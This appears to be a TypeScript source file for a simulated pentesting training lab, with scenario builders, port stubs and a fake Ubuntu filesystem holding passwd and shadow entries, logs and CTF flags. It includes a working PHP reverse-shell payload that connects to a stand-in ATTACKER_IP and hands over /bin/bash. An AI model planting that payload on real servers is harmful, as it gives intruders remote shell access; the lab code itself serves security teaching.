// ── laboratorios/templates.ts ──────────────────────────────────────
// Plantillas reutilizables para crear escenarios de pentesting
// Evita duplicación de código en los archivos de ejercicios

import { assignDHCP } from '../utils/network';
import type { Machine, Scenario, MachineInfo, Port, LearningStep, Mission, FileEntry } from '../types';
import { createLinuxFileSystem, createWindowsFileSystem } from '../fs-models';
import type { LinuxFileSystemConfig, WindowsFileSystemConfig } from '../fs-models';
import { createKaliMachine, resetKaliCounter } from './attackers';

// Re-export para que los labs que usaban resetAttackerCounter sigan funcionando
export const resetAttackerCounter = resetKaliCounter;

export function createAttackerMachine(networkRange: string, customHostname?: string): Machine {
  return createKaliMachine({ networkRange, hostname: customHostname });
}

export interface ScenarioBuilderConfig {
  id: string; name: string; description: string;
  difficulty: 'Easy' | 'Medium' | 'Hard';
  category: 'Web' | 'Network' | 'Crypto' | 'Forensics';
  networkRange: string; attackerFiles?: FileEntry[];
  targetMachine: Omit<Machine, 'machine_info' | 'id' | 'learning_steps'> & { id: string; machine_info: Omit<MachineInfo, 'ip'>; ports: Port[] };
  learningSteps: (Omit<LearningStep, 'id' | 'targetMachineId'> & { validationCriteria?: import('../types').ValidationCriteria })[];
}

export function buildScenario(config: ScenarioBuilderConfig): Scenario {
  const attacker = createAttackerMachine(config.networkRange);
  if (config.attackerFiles?.length) {
    attacker.files = [...attacker.files, ...config.attackerFiles];
  }
  const target: Machine = {
    ...config.targetMachine,
    machine_info: { ...config.targetMachine.machine_info, ip: '' } as MachineInfo,
    scan_results: { ports: config.targetMachine.ports },
    web_enumeration: config.targetMachine.web_enumeration || { web_server: 'none', cms: 'none', directories: [] },
    discovery_level: 0,
    learning_steps: config.learningSteps.map((step, idx) => ({ ...step, id: idx + 1, targetMachineId: config.targetMachine.id })),
    files: config.targetMachine.files || [],
  };
  const machines = assignDHCP(config.networkRange, [attacker, target]);

  // Reemplazar placeholders en archivos del atacante (payloads, etc.)
  // IMPORTANTE: se aplica a machines[0] porque assignDHCP crea nuevos objetos via spread
  const attackerMachine = machines.find(m => m.id === 'attacker-01');
  if (attackerMachine?.files) {
    attackerMachine.files = attackerMachine.files.map(f => ({
      ...f,
      content: f.content
        .replace(/ATTACKER_IP/g, attackerMachine.machine_info.ip || '127.0.0.1')
        .replace(/LISTENER_PORT/g, '4444'),
    }));
  }

  const missions: Mission[] = config.learningSteps.map((step, idx) => ({
    id: idx + 1, title: step.task, titleEs: step.taskEs, description: step.text, descriptionEs: step.textEs,
    status: idx === 0 ? 'active' : 'pending', targetMachineId: config.targetMachine.id, discoveryLevel: step.discoveryLevel,
    hints: step.hints, hintLevel: 0,
    validationCriteria: step.validationCriteria,
  }));
  return {
    id: config.id, name: config.name, description: config.description,
    difficulty: config.difficulty, category: config.category, network_range: config.networkRange,
    initialMachineId: 'attacker-01', machines, missions,
  };
}

export const COMMON_PORTS = {
  ssh: (version = 'OpenSSH 8.2p1 Ubuntu', creds?: { user: string; pass: string }): Port => ({ port: 22, protocol: 'tcp', state: 'open', service: 'ssh', version, credentials: creds }),
  ftp: (version = 'vsFTPd 3.0.3'): Port => ({ port: 21, protocol: 'tcp', state: 'open', service: 'ftp', version }),
  http: (version = 'Apache httpd 2.4.41'): Port => ({ port: 80, protocol: 'tcp', state: 'open', service: 'http', version }),
  https: (version = 'nginx'): Port => ({ port: 443, protocol: 'tcp', state: 'open', service: 'https', version }),
  mysql: (state: 'open' | 'filtered' | 'closed' = 'filtered'): Port => ({ port: 3306, protocol: 'tcp', state, service: 'mysql', version: state === 'open' ? 'MySQL 5.7.38' : 'unknown' }),
  smb: (version = 'Windows 7 Professional 7601'): Port => ({ port: 445, protocol: 'tcp', state: 'open', service: 'microsoft-ds', version }),
  rdp: (): Port => ({ port: 3389, protocol: 'tcp', state: 'open', service: 'ms-wbt-server', version: 'Microsoft Terminal Services' }),
};

export function createWebDirs(paths: Array<{ path: string; status: 200 | 301 | 403 | 404; description: string }>) {
  return paths.map(p => ({ path: p.path, status: p.status, description: p.description }));
}

export function createFile(path: string, content: string, type: 'text' | 'hash' | 'binary' = 'text') {
  return { path, content, type };
}

export const REVERSE_SHELL_PAYLOAD = {
  phpSimple: `<?php\n\$ip = "ATTACKER_IP"; \$port = LISTENER_PORT;\n\$sock = fsockopen(\$ip, \$port);\nif(\$sock === false) { echo "No connection"; exit(); }\n\$proc = proc_open('/bin/bash', array(0=>\$sock,1=>\$sock,2=>\$sock), \$pipes);\n?>`,
};

// Re-exportar funciones de fs-models para compatibilidad
export { createLinuxFileSystem, createWindowsFileSystem };
export type { LinuxFileSystemConfig, WindowsFileSystemConfig };

export function createLinuxFileSystemLegacy(config: LinuxFileSystemConfig = {}) {
  const u = config.username || 'www-data';
  const sp = config.shadowPassword || '$6$rounds=656000$abcdefghijklmnop$1234567890abcdefghijklmnop/1234567890123456';
  return [
    // ═══════════════════════════════════════════════════════════════
    // ESTRUCTURA DE DIRECTORIOS RAÍZ (directorios vacíos para ls)
    // ═══════════════════════════════════════════════════════════════
    createFile('/bin/.dir', '', 'text'),
    createFile('/boot/.dir', '', 'text'),
    createFile('/dev/.dir', '', 'text'),
    createFile('/etc/.dir', '', 'text'),
    createFile('/home/.dir', '', 'text'),
    createFile('/lib/.dir', '', 'text'),
    createFile('/lib64/.dir', '', 'text'),
    createFile('/media/.dir', '', 'text'),
    createFile('/mnt/.dir', '', 'text'),
    createFile('/opt/.dir', '', 'text'),
    createFile('/proc/.dir', '', 'text'),
    createFile('/root/.dir', '', 'text'),
    createFile('/run/.dir', '', 'text'),
    createFile('/sbin/.dir', '', 'text'),
    createFile('/srv/.dir', '', 'text'),
    createFile('/sys/.dir', '', 'text'),
    createFile('/tmp/.dir', '', 'text'),
    createFile('/usr/.dir', '', 'text'),
    createFile('/var/.dir', '', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /etc/ - Archivos de configuración del sistema
    // ═══════════════════════════════════════════════════════════════
    createFile('/etc/passwd', `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
admin:x:1000:1000:Admin User:/home/admin:/bin/bash
${u}:x:1001:1001:${u}:/home/${u}:/bin/bash
mysql:x:112:118:MySQL Server,,,:/nonexistent:/bin/false
postgres:x:113:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
ftp:x:114:121:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin`, 'text'),

    createFile('/etc/shadow', `root:$6$rounds=656000$YQKGMFNqQvL7JH8d$Hq2yfK8fhj5P9xMpW3vB6nC4dE7gI0jK1lM2nO3pQ4rS5tU6vW7xY8zA9bB0cC1dD2eE3fF4gG5hH6iI:19400:0:99999:7:::
daemon:*:19400:0:99999:7:::
bin:*:19400:0:99999:7:::
sys:*:19400:0:99999:7:::
sync:*:19400:0:99999:7:::
games:*:19400:0:99999:7:::
man:*:19400:0:99999:7:::
lp:*:19400:0:99999:7:::
mail:*:19400:0:99999:7:::
news:*:19400:0:99999:7:::
uucp:*:19400:0:99999:7:::
proxy:*:19400:0:99999:7:::
www-data:*:19400:0:99999:7:::
backup:*:19400:0:99999:7:::
list:*:19400:0:99999:7:::
irc:*:19400:0:99999:7:::
gnats:*:19400:0:99999:7:::
nobody:*:19400:0:99999:7:::
systemd-network:*:19400:0:99999:7:::
systemd-resolve:*:19400:0:99999:7:::
systemd-timesync:*:19400:0:99999:7:::
messagebus:*:19400:0:99999:7:::
syslog:*:19400:0:99999:7:::
_apt:*:19400:0:99999:7:::
tss:*:19400:0:99999:7:::
uuidd:*:19400:0:99999:7:::
tcpdump:*:19400:0:99999:7:::
sshd:*:19400:0:99999:7:::
landscape:*:19400:0:99999:7:::
pollinate:*:19400:0:99999:7:::
admin:${sp}:19400:0:99999:7:::
${u}:$6$rounds=656000$saltysalt$hashedpassword1234567890abcdef/1234567890:19400:0:99999:7:::
mysql:!:19400:0:99999:7:::
postgres:$6$rounds=656000$anothersalt$anotherhash9876543210fedcba/0987654321:19400:0:99999:7:::
ftp:*:19400:0:99999:7:::`, 'text'),

    createFile('/etc/hostname', 'target-server', 'text'),
    createFile('/etc/hosts', '127.0.0.1\tlocalhost\n127.0.1.1\ttarget-server\n::1\t\tlocalhost ip6-localhost ip6-loopback\nff02::1\t\tip6-allnodes\nff02::2\t\tip6-allrouters', 'text'),
    createFile('/etc/os-release', 'NAME="Ubuntu"\nVERSION="20.04.6 LTS (Focal Fossa)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 20.04.6 LTS"\nVERSION_ID="20.04"\nHOME_URL="https://www.ubuntu.com/"\nSUPPORT_URL="https://help.ubuntu.com/"\nBUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"\nPRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"\nVERSION_CODENAME=focal', 'text'),
    createFile('/etc/issue', 'Ubuntu 20.04.6 LTS \\n \\l\n', 'text'),
    createFile('/etc/motd', '\nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-169-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Mon Mar 18 14:23:45 2024 from 192.168.1.100\n', 'text'),
    createFile('/etc/resolv.conf', '# This file is managed by man:systemd-resolved(8). Do not edit.\n#\n# This is a dynamic resolv.conf file for connecting local clients to the\n# internal DNS stub resolver of systemd-resolved.\nnameserver 127.0.0.53\noptions edns0 trust-ad\nsearch localdomain', 'text'),
    createFile('/etc/fstab', '# /etc/fstab: static file system information.\n#\n# Use blkid to print the universally unique identifier for a\n# device; this may be used with UUID= as a more robust way to name devices\n# that works even if disks are added and removed.\n# <file system> <mount point>   <type>  <options>       <dump>  <pass>\nUUID=12345678-1234-1234-1234-123456789012 /               ext4    errors=remount-ro 0       1\nUUID=87654321-4321-4321-4321-210987654321 /boot           ext4    defaults        0       2\n/swapfile                                 none            swap    sw              0       0', 'text'),
    createFile('/etc/crontab', '# /etc/crontab: system-wide crontab\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly\n25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )', 'text'),

    // /etc/apache2/
    createFile('/etc/apache2/.dir', '', 'text'),
    createFile('/etc/apache2/apache2.conf', '# This is the main Apache server configuration file.\nServerRoot "/etc/apache2"\nMutex file:${APACHE_LOCK_DIR} default\nPidFile ${APACHE_PID_FILE}\nTimeout 300\nKeepAlive On\nMaxKeepAliveRequests 100\nKeepAliveTimeout 5\n\n# These need to be set in /etc/apache2/envvars\nUser ${APACHE_RUN_USER}\nGroup ${APACHE_RUN_GROUP}\n\nHostnameLookups Off\nErrorLog ${APACHE_LOG_DIR}/error.log\nLogLevel warn\n\nIncludeOptional mods-enabled/*.load\nIncludeOptional mods-enabled/*.conf\nInclude ports.conf\n\n<Directory />\n\tOptions FollowSymLinks\n\tAllowOverride None\n\tRequire all denied\n</Directory>\n\n<Directory /var/www/>\n\tOptions Indexes FollowSymLinks\n\tAllowOverride All\n\tRequire all granted\n</Directory>\n\nAccessFileName .htaccess\n<FilesMatch "^\\.ht">\n\tRequire all denied\n</FilesMatch>\n\nLogFormat "%v:%p %h %l %u %t \\"%r\\" %>s %O \\"%{Referer}i\\" \\"%{User-Agent}i\\"" vhost_combined\nLogFormat "%h %l %u %t \\"%r\\" %>s %O \\"%{Referer}i\\" \\"%{User-Agent}i\\"" combined\nLogFormat "%h %l %u %t \\"%r\\" %>s %O" common\n\nIncludeOptional conf-enabled/*.conf\nIncludeOptional sites-enabled/*.conf', 'text'),
    createFile('/etc/apache2/ports.conf', 'Listen 80\n\n<IfModule ssl_module>\n\tListen 443\n</IfModule>\n\n<IfModule mod_gnutls.c>\n\tListen 443\n</IfModule>', 'text'),

    // /etc/ssh/
    createFile('/etc/ssh/.dir', '', 'text'),
    createFile('/etc/ssh/sshd_config', '# OpenSSH Server Configuration\nPort 22\nAddressFamily any\nListenAddress 0.0.0.0\nListenAddress ::\n\nPermitRootLogin prohibit-password\nPubkeyAuthentication yes\nPasswordAuthentication yes\nPermitEmptyPasswords no\nChallengeResponseAuthentication no\nUsePAM yes\nX11Forwarding yes\nPrintMotd no\nAcceptEnv LANG LC_*\nSubsystem sftp /usr/lib/openssh/sftp-server', 'text'),

    // /etc/mysql/
    createFile('/etc/mysql/.dir', '', 'text'),
    createFile('/etc/mysql/my.cnf', '[mysqld]\npid-file\t= /var/run/mysqld/mysqld.pid\nsocket\t\t= /var/run/mysqld/mysqld.sock\ndatadir\t\t= /var/lib/mysql\nlog-error\t= /var/log/mysql/error.log\n\n# Disabling symbolic-links is recommended to prevent assorted security risks\nsymbolic-links=0\n\n# * IMPORTANT: Additional settings that can override those from this file!\n#   The files must end with \'.cnf\', otherwise they\'ll be ignored.\n!includedir /etc/mysql/conf.d/\n!includedir /etc/mysql/mysql.conf.d/', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /var/ - Archivos variables del sistema
    // ═══════════════════════════════════════════════════════════════
    createFile('/var/log/.dir', '', 'text'),
    createFile('/var/www/.dir', '', 'text'),
    createFile('/var/lib/.dir', '', 'text'),
    createFile('/var/mail/.dir', '', 'text'),
    createFile('/var/spool/.dir', '', 'text'),
    createFile('/var/backups/.dir', '', 'text'),
    createFile('/var/cache/.dir', '', 'text'),
    createFile('/var/run/.dir', '', 'text'),

    createFile('/var/log/syslog', 'Mar 19 10:00:01 target-server systemd[1]: Started Daily apt download activities.\nMar 19 10:00:01 target-server systemd[1]: Starting Daily apt download activities...\nMar 19 10:00:02 target-server systemd[1]: apt-daily.service: Succeeded.\nMar 19 10:15:01 target-server CRON[2345]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)\nMar 19 10:17:01 target-server systemd[1]: Starting Clean php session files...\nMar 19 10:17:01 target-server systemd[1]: phpsessionclean.service: Succeeded.\nMar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:23:45 target-server sshd[1234]: pam_unix(sshd:session): session opened for user admin by (uid=0)\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nMar 19 10:24:12 target-server sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)', 'text'),
    createFile('/var/log/auth.log', 'Mar 19 10:00:01 target-server systemd-logind[567]: New session c1 of user root.\nMar 19 10:15:01 target-server CRON[2345]: pam_unix(cron:session): session opened for user root by (uid=0)\nMar 19 10:15:01 target-server CRON[2345]: pam_unix(cron:session): session closed for user root\nMar 19 10:23:45 target-server sshd[1234]: Accepted password for admin from 192.168.1.100 port 54321 ssh2\nMar 19 10:23:45 target-server sshd[1234]: pam_unix(sshd:session): session opened for user admin by (uid=0)\nMar 19 10:24:12 target-server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash\nMar 19 10:24:12 target-server sudo: pam_unix(sudo:session): session opened for user root by admin(uid=0)\nMar 19 10:25:33 target-server sshd[1234]: pam_unix(sshd:session): session closed for user admin', 'text'),
    createFile('/var/log/kern.log', 'Mar 19 10:00:00 target-server kernel: [    0.000000] Linux version 5.4.0-169-generic (buildd@lcy02-amd64-029) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.2)) #187-Ubuntu SMP Thu Nov 23 14:52:28 UTC 2023\nMar 19 10:00:00 target-server kernel: [    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-5.4.0-169-generic root=UUID=12345678-1234-1234-1234-123456789012 ro quiet splash\nMar 19 10:00:00 target-server kernel: [    0.000000] KERNEL supported cpus:', 'text'),

    // /var/www/html/
    createFile('/var/www/html/.dir', '', 'text'),
    createFile('/var/www/html/index.html', '<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Apache2 Ubuntu Default Page</title>\n    <style>\n        body { font-family: Ubuntu, sans-serif; background: #f5f5f5; margin: 0; padding: 40px; }\n        .container { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }\n        h1 { color: #333; border-bottom: 2px solid #e95420; padding-bottom: 10px; }\n        .info { background: #f0f0f0; padding: 15px; border-radius: 4px; margin: 20px 0; }\n    </style>\n</head>\n<body>\n    <div class="container">\n        <h1>Apache2 Ubuntu Default Page</h1>\n        <p><strong>It works!</strong></p>\n        <p>This is the default welcome page used to test the correct operation of the Apache2 server.</p>\n        <div class="info">\n            <strong>Server Information:</strong><br>\n            Server Version: Apache/2.4.41 (Ubuntu)<br>\n            Document Root: /var/www/html<br>\n            Configuration: /etc/apache2/apache2.conf\n        </div>\n        <p>If you can read this page, it means that the Apache HTTP server installed at this site is working properly.</p>\n    </div>\n</body>\n</html>', 'text'),
    createFile('/var/www/html/.htaccess', '# Apache .htaccess configuration\n# AuthType Basic\n# AuthName "Restricted Area"\n# AuthUserFile /var/www/html/.htpasswd\n# Require valid-user\n\n# WordPress Rewrite Rules\n<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n</IfModule>', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /home/ - Directorios de usuarios
    // ═══════════════════════════════════════════════════════════════
    createFile('/home/admin/.dir', '', 'text'),
    createFile('/home/admin/.bashrc', '# ~/.bashrc: executed by bash(1) for non-login shells.\n\n# If not running interactively, don\'t do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don\'t put duplicate lines or lines starting with space in the history.\nHISTCONTROL=ignoreboth\n\n# append to the history file, don\'t overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# check the window size after each command and update LINES and COLUMNS\nshopt -s checkwinsize\n\n# Alias definitions\nalias ll=\'ls -l\'\nalias la=\'ls -la\'\nalias l=\'ls -CF\'\nalias ..=\'cd ..\'\nalias ...=\'cd ../..\'\n\n# User specific environment\nexport PATH="$HOME/bin:$HOME/.local/bin:$PATH"\nexport EDITOR=nano', 'text'),
    createFile('/home/admin/.profile', '# ~/.profile: executed by the command interpreter for login shells.\n# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login exists.\n\n# if running bash\nif [ -n "$BASH_VERSION" ]; then\n    # include .bashrc if it exists\n    if [ -f "$HOME/.bashrc" ]; then\n\t. "$HOME/.bashrc"\n    fi\nfi\n\n# set PATH so it includes user\'s private bin if it exists\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi\n\nif [ -d "$HOME/.local/bin" ] ; then\n    PATH="$HOME/.local/bin:$PATH"\nfi', 'text'),
    createFile('/home/admin/.bash_history', 'ls -la\npwd\ncat /etc/passwd\nsudo su\nwhoami\nifconfig\nnmap 192.168.1.0/24\ncd /var/www/html\nls -la\ncat config.php\nmysql -u root -p\nexit', 'text'),
    createFile('/home/admin/user.txt', 'THM{USER_ACCESS_GRANTED}', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /root/ - Directorio del superusuario
    // ═══════════════════════════════════════════════════════════════
    createFile('/root/.bashrc', '# ~/.bashrc: executed by bash(1) for non-login shells.\n\n# If not running interactively, don\'t do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\nHISTCONTROL=ignoreboth\nshopt -s histappend\nHISTSIZE=1000\nHISTFILESIZE=2000\nshopt -s checkwinsize\n\n# Alias definitions\nalias ll=\'ls -l\'\nalias la=\'ls -la\'\nalias l=\'ls -CF\'\n\n# Root specific\nexport PATH="/root/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"\nexport EDITOR=nano', 'text'),
    createFile('/root/.profile', '# ~/.profile: executed by the command interpreter for login shells.\nif [ -n "$BASH_VERSION" ]; then\n    if [ -f "$HOME/.bashrc" ]; then\n\t. "$HOME/.bashrc"\n    fi\nfi\n\nif [ -d "$HOME/bin" ] ; then\n    PATH="$HOME/bin:$PATH"\nfi', 'text'),
    createFile('/root/flag.txt', 'THM{ROOT_ACCESS_ACHIEVED}', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /usr/ - Programas y datos de usuario
    // ═══════════════════════════════════════════════════════════════
    createFile('/usr/bin/.dir', '', 'text'),
    createFile('/usr/sbin/.dir', '', 'text'),
    createFile('/usr/lib/.dir', '', 'text'),
    createFile('/usr/local/.dir', '', 'text'),
    createFile('/usr/share/.dir', '', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /tmp/ - Archivos temporales
    // ═══════════════════════════════════════════════════════════════
    createFile('/tmp/.dir', '', 'text'),

    // ═══════════════════════════════════════════════════════════════
    // /opt/ - Software opcional
    // ═══════════════════════════════════════════════════════════════
    createFile('/opt/.dir', '', 'text'),
  ];
}
